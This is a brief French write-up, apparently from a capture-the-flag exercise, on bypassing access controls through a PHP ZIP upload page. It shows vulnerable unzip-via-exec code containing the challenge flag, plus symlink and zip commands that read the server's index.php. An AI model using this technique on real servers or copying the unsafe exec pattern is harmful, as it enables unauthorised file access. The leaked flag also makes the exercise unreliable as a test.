Avec un fichier ZIP le bypass des droits d’acces est possible avec un page d’upload de ce type: 

```php
$zip = new ZipArchive;
        if ($zip->open($uploadfile)) {
            // Don't know if this is safe, but it works, someone told me the flag is N3v3r_7rU5T_u5Er_1npU7 , did not understand what it means
            exec("/usr/bin/timeout -k2 3 /usr/bin/unzip '$uploadfile' -d '$uploaddir'", $output, $ret);
            $message = "<p>File unzipped <a href='".$uploaddir."'>here</a>.</p>";
	    $zip->close();
```

Si la page possède se comportement d’upload alors pour le bypass 

```bash
ln -s "../../../index.php" ./symlink.txt
#Cela fait un lien symbolique vers **../../../index.php** dans **symlink.txt**
```

```bash
zip --symlink -r test.zip ./symlink.txt
#ZIP du fichier symlink.txt dans test.zip
##L'extention ""--symlink"" permet de stocker le lien symbolique dans le ZIP
```

Une fois que le srv à extrait les données du ZIP alors il suffit de lancer le txt et les commandes serront éxécutés donc ici lire le index.php